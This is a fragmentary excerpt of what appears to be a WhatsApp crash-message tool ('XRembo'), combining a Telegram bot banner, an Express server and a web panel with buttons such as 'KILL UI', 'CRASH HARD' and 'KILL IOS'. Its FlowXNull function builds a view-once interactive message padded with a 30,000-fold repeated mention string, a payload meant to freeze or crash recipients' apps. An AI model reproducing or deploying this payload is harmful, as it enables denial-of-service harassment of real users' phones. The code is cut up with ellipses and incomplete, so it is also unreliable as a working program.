...
╔══════════════════════════════════════╗
║   ${chalk.bgBlackBright.bold(' XRembo - System Aktif  ')}.  ║
╠══════════════════════════════════════╣
...
`;
  ...
  ctx.replyWithMarkdown(message, {
    ...
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Contact Admin", url: "https://t.me/RmboXcrash" }
        ]
      ]
    }
  });
...
async function FlowXNull(X) {
  const MSG = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "COBAIN WORK SETOR  \n" + 
                 "@0@1".repeat(30000),
            format: "DEFAULT",
            contextInfo: {
              mentionedJid: [
...
<body>
  ...
  <div class="top-bar">
    <div class="top-title">MYSOLOLEVELINGX</div>
    ...
    <section id="bug-section" class="content-section active">
      ...
      <div class="box">
        <div class="buttons-grid">
          <button class="mode-btn" data-mode="androdelay2"><i class="fa fa-bug"></i> XRembo - KILL UI</button>
          <button class="mode-btn" data-mode="androdelay"><i class="fa fa-bug"></i> XRembo - CRASH HARD</button>
          <button class="mode-btn full" data-mode="iosfc"><i class="fa fa-bug"></i> XRembo - KILL IOS</button>
        </div>
...
app.get("/", (req, res) => {
  ...
  const filePath = path.join(__dirname, "Xsɨsŧɇm", "index.html");
...
app.get("/login", (req, res) => {
  ...
  const filePath = path.join(__dirname, "Xsɨsŧɇm", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
